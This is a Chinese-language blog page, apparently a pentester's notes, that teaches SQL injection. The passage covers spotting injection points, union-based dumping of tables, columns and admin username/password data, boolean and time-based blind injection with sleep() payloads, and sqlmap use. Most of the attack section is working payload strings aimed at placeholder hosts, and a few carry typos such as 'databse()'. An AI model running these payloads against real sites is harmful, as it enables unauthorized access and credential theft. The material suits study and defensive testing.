@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="sql注入简介sql注入攻击是由插入或注入一段从客户端输入的sql语句引起的。一个成功的sql注入利用(exploit)能从数据库读取敏感数据，改变数据库数据（通过Insert&#x2F;Update&#x2F;Delete），在数据库执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web渗透笔记之sql注入（基础篇）">
+<meta property="og:url" content="http://yoursite.com/2019/04/02/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/index.html">
+<meta property="og:site_name" content="yida223&#39; blog">
+<meta property="og:description" content="sql注入简介sql注入攻击是由插入或注入一段从客户端输入的sql语句引起的。一个成功的sql注入利用(exploit)能从数据库读取敏感数据，改变数据库数据（通过Insert&#x2F;Update&#x2F;Delete），在数据库执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/pasted-1.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-2.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-3.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-4.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-5.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-6.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-7.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-8.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-9.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-10.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-11.png">
+<meta property="article:published_time" content="2019-04-02T12:59:00.000Z">
+<meta property="article:modified_time" content="2019-08-09T16:06:45.244Z">
+<meta property="article:author" content="yida223">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/04/02/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web渗透笔记之sql注入（基础篇） | yida223' blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yida223' blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/02/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yida223">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yida223' blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web渗透笔记之sql注入（基础篇）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-02 20:59:00" itemprop="dateCreated datePublished" datetime="2019-04-02T20:59:00+08:00">2019-04-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-10 00:06:45" itemprop="dateModified" datetime="2019-08-10T00:06:45+08:00">2019-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">渗透之路</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="sql注入简介"><a href="#sql注入简介" class="headerlink" title="sql注入简介"></a>sql注入简介</h2><p>sql注入攻击是由插入或注入一段从客户端输入的sql语句引起的。一个成功的sql注入利用(exploit)能从数据库读取敏感数据，改变数据库数据（通过Insert/Update/Delete），在数据库执行</p>
+<a id="more"></a>
+<p>(execute)管理员操作（比如关闭数据库管理系统DBMS），在DBMS文件系统上回复指定文件的内容和在一些场景下执行操作系统命令（command）。sql注入攻击是一种注入攻击，它将sql命令注入到数据平面（data-plan）使得影响预先设置的sql命令的执行结果。</p>
+<h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><hr>
+<p>1.<strong>字符型</strong></p>
+<p>法一：</p>
+<blockquote>
+<ul>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a>  报错</li>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a> and ‘1’ =’1，查询成功</li>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a> and ‘1’ =’2，查询失败，返回结果为空或错误</li>
+</ul>
+</blockquote>
+<p>法二：</p>
+<blockquote>
+<ul>
+<li>1’ and 1=1 # （1’ and 1=1- -+）<ul>
+<li>(#或–代表注释的意思，用- -时后需加空格，或用+也可执行成功)<br>例：select * from table where name =’article’ and 1=1- -+’(- -+可将后面的注释掉)</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><strong>说明存在字符型注入</strong></p>
+<p>2.<strong>数字型</strong></p>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22&#39;</a>  返回错误(网页消失)<br><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> and 1=1 返回正常<br><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> and 1=2返回错误   </p>
+</blockquote>
+<p><strong>说明存在数字型注入</strong> </p>
+<h2 id="猜解SQL查询语句中的字段"><a href="#猜解SQL查询语句中的字段" class="headerlink" title="猜解SQL查询语句中的字段"></a><strong>猜解SQL查询语句中的字段</strong></h2><hr>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> order by n<br>n为数字，从1开始，当查询到n+1时报错，则字段数为n</p>
+</blockquote>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> union select 1,2…n from admin<br> // admin为猜解的表名</p>
+</blockquote>
+<p>order by  查询几个字段  然后union select 1,2…查看相关字段(回显id代表的含义)。例如union select user(),database()<br>2.<br><img src="/images/pasted-1.png" alt="upload successful"></p>
+<p>3.获取数据库中的表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#    //字符型</span></span><br><span class="line"><span class="keyword">id</span> =<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+
+<p>4.获取表中的字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id =1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users ’# //若'</span>字符被转义则可换成十六进制形式</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=’<span class="keyword">data</span>’) </span><br><span class="line">//<span class="keyword">data</span> 和<span class="keyword">users</span>为表名</span><br></pre></td></tr></table></figure>
+<p>5.获取数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union <span class="keyword">select</span> <span class="keyword">version</span>(),(<span class="keyword">select</span> thekey <span class="keyword">from</span> <span class="keyword">data</span>) //thekey是字段名</span><br></pre></td></tr></table></figure>
+<p>7.下载数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><p>读出所有库:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com/1.php?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+
+<p>读出所有表:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com/1.php?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.tables(<span class="keyword">admin</span>) <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<p>mysql4.1以上版本支持concat函数</p>
+<p>a.  执行语句<br>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x77677978797765626D6973</span></span><br></pre></td></tr></table></figure><br> 结果爆出  admin等表 </p>
+<p>b.  执行:</p>
+<pre><code> and 1=2 union select 1,2,3,4,group_concat(column_name),6,7,8,9,10 from
+    information_schema.columns where table_name=0x61646D696E
+
+结果爆出:  username,password  等一些 字段</code></pre><p>c.执行:</p>
+<pre><code> and 1=2 union select 1,2,3,4,group_concat(username,0x3a,password),6,7,
+    8,9,10 from admin
+结果爆出:字段内容</code></pre><h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入<code>1&#39;and 1=1 #</code>，显示存在<br>输入<code>1&#39;and 1=2 #</code>，显示不存在：说明存在</p>
+<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><ul>
+<li>输入<code>1&#39; and length(database())=1 #</code>，显示不存在</li>
+<li>输入<code>1&#39; and length(database())=2 #</code>，显示不存在；</li>
+<li>输入<code>1&#39; and length(database())=3 #</code>，显示存在； </li>
+<li><em>二分法猜名字*</em></li>
+<li>输入<code>1&#39; and ascii(substr(databse(),1,1))&gt;97 #</code>，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</li>
+<li>输入<code>1&#39; and ascii(substr(databse(),1,1))&lt;122 #</code>，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）</li>
+</ul>
+<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p><strong>首先猜解数据库中表的数量：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span> <span class="comment"># 显示不存在\</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() )=<span class="number">2</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明数据库中共有两个表，接着挨个猜解表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明表名长为9</strong></p>
+<p><strong>表名猜测一样用二分法</strong></p>
+<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br></pre></td></tr></table></figure>
+<p>…</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">8</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+<p>猜字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br></pre></td></tr></table></figure>
+<p>…<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">7</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>长度为7，然后二分法猜表名<h3 id="5-猜数据-，一样思路"><a href="#5-猜数据-，一样思路" class="headerlink" title="5.猜数据 ，一样思路"></a>5.猜数据 ，一样思路</h3><h1 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h1><h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3>输入<code>1’ and sleep(5) #</code>，感觉到明显延迟；<br>输入<code>1 and sleep(5) #</code>，没有延迟；<br>说明字符型注入<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 1’ and if(length(database())=1,sleep(5),1) <span class="comment"># 没有延迟</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ and if(length(database())=4,sleep(5),1) <span class="comment"># 明显延迟</span></span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库名长度为4个字符。<br>接着采用二分法猜解数据库名：*</em><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</span><br><span class="line">…</span><br><span class="line">1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</span><br><span class="line">1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库名的第一个字符为小写字母d。*</em><h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3></li>
+<li><em>首先猜解数据库中表的数量：*</em><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</span><br><span class="line">* 1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库中共有两个表。*</em></li>
+</ul>
+<p><strong>接着挨个猜解表名：</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</span><br><span class="line">* …</span><br><span class="line">* 1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</span><br></pre></td></tr></table></figure>
+<p><strong>说明第一个表名长度为9。二分法猜出表名</strong></p>
+<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p><strong>首先猜解表中字段的数量：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’ and if((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment"># 没有延迟</span></span><br><span class="line">…</span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">8</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment"># 明显延迟</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明users表中有8个字段。</strong></p>
+<p><strong>接着挨个猜解字段名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’ and if(length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment"># 没有延迟</span></span><br><span class="line">…</span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">7</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment"># 明显延迟**</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明users表的第一个字段长度为7个字符。<br>采用二分法即可猜解出各个字段名。</strong></p>
+<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>1.输入账号密码，用bp抓包<br>2.复制包的内容到txt文本<br>3.用sqlmap注入  <code>sqlmap.py -r post.txt</code></p>
+<h1 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h1><p>1.不支持时间盲注<br>2.只能爆破表名，不建议手工，可用啊D，sqlmap等工具</p>
+<hr>
+<h1 id="其他注入点检测方法"><a href="#其他注入点检测方法" class="headerlink" title="其他注入点检测方法"></a>其他注入点检测方法</h1><blockquote>
+<p><a href="http://xxx.com/news.asp?id=123-1" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123-1</a></p>
+</blockquote>
+<p>如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞；</p>
+<p>URL地址后面加上 -0，</p>
+<blockquote>
+<p><a href="http://xxx.com/news.asp?id=123-0" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123-0</a></p>
+</blockquote>
+<p>返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，是数字型的。</p>
+<p> 在URL的地址后面加上’%2B’</p>
+<blockquote>
